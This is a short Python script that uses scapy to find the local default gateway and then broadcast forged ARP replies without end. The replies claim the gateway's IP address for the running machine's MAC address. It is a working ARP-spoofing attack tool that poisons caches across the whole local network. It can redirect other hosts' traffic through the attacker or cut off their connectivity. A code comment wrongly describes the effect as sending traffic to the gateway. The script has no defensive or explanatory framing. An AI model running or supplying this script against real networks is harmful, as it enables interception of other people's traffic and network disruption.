
import netifaces
from scapy.all import ARP, Ether, sendp

def get_local_gateway():
    # Get the IP address of the gateway using the netifaces module
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    return default_gateway

def get_local_mac(interface):
    # Get the MAC address of the specified interface
    try:
        mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
        return mac_address
    except:
        print("Unable to get the MAC address of the specified interface.")
        return None

def send_arp_packet(gateway_ip, local_mac, interface):
    arp_reply = ARP(pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=local_mac)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = ether / arp_reply

    print("Sending ARP packets continuously...")

    while True:
        # Send ARP packets to all IP addresses in the subnet
        sendp(arp_packet, iface=interface, verbose=False)

def main():
    # Find the local gateway
    gateway_ip = get_local_gateway()
    print("Default gateway of the local network:", gateway_ip)

    # Find the MAC address of the specified network interface
    interface = input("Enter the name of the network interface (e.g., eth0): ")
    local_mac = get_local_mac(interface)
    if local_mac is None:
        return

    # Send ARP packets continuously to direct all traffic to the gateway
    send_arp_packet(gateway_ip, local_mac, interface)

if __name__ == "__main__":
    main()
